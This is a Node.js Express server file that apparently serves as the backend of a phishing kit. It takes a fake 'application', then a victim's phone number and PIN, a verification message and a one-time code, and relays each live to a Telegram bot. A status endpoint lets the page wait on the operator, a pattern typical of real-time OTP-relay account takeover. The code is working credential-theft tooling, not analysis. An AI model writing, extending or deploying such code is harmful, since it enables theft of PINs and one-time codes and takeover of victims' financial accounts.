// server.js
require('dotenv').config();
const express = require('express');
const path = require('path');
const db = require('./db');
const telegram = require('./telegram');

const app = express();
app.use(express.json());

// GLOBAL LOGGER: This will print every incoming request to the Render logs
app.use((req, res, next) => {
    console.log(`[INCOMING REQUEST] ${req.method} ${req.url}`);
    next();
});

// Serve the index.html file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// DEBUG ROUTE: Check Telegram Webhook Status
app.get('/check-webhook', async (req, res) => {
    try {
        const info = await telegram.bot.getWebHookInfo();
        res.json(info);
    } catch (error) {
        res.json({ error: error.message });
    }
});

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// TELEGRAM WEBHOOK ROUTE (Changed to /webhook to avoid Express 5 colon issues)
app.post('/webhook', (req, res) => {
    console.log('🚨 WEBHOOK RECEIVED FROM TELEGRAM!');
    telegram.bot.processUpdate(req.body);
    res.sendStatus(200);
});

// API Routes
app.post('/api/apply', async (req, res) => {
    const sessionId = Date.now().toString();
    const data = req.body;
    db.createSession(sessionId, data);
    await telegram.sendApplicationToTelegram(sessionId, data);
    res.json({ success: true, sessionId });
});

app.post('/api/login', async (req, res) => {
    const { sessionId, phone, pin } = req.body;
    const session = db.getSession(sessionId);
    if (!session) return res.status(404).json({ error: "Session not found" });

    db.updateStatus(sessionId, 'PENDING_PIN');
    session.phone = phone;
    session.pin = pin;

    await telegram.sendPinToTelegram(sessionId, { phone, pin });
    res.json({ success: true });
});

app.post('/api/verification', async (req, res) => {
    const { sessionId, verificationMsg } = req.body;
    const session = db.getSession(sessionId);
    if (!session) return res.status(404).json({ error: "Session not found" });

    db.updateStatus(sessionId, 'PENDING_VERIFICATION');
    session.verificationMsg = verificationMsg;

    await telegram.sendVerificationToTelegram(sessionId, { phone: session.phone, verificationMsg });
    res.json({ success: true });
});

app.post('/api/otp', async (req, res) => {
    const { sessionId, otp } = req.body;
    const session = db.getSession(sessionId);
    if (!session) return res.status(404).json({ error: "Session not found" });

    db.updateStatus(sessionId, 'PENDING_OTP');
    session.otp = otp;

    await telegram.sendOtpToTelegram(sessionId, { phone: session.phone, otp });
    res.json({ success: true });
});

app.get('/api/status/:sessionId', (req, res) => {
    const session = db.getSession(req.params.sessionId);
    if (!session) return res.status(404).json({ error: "Session not found" });
    res.json({ status: session.status });
});

// Start Server & Set Telegram Webhook
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
    console.log(`Server running at http://localhost:${PORT}`);
    
    if (process.env.RENDER_EXTERNAL_URL) {
        const webhookUrl = `${process.env.RENDER_EXTERNAL_URL}/webhook`;
        try {
            await telegram.bot.setWebHook(webhookUrl);
            console.log(`✅ Webhook set to: ${webhookUrl}`);
        } catch (error) {
            console.error('❌ Failed to set webhook:', error);
        }
    }
});
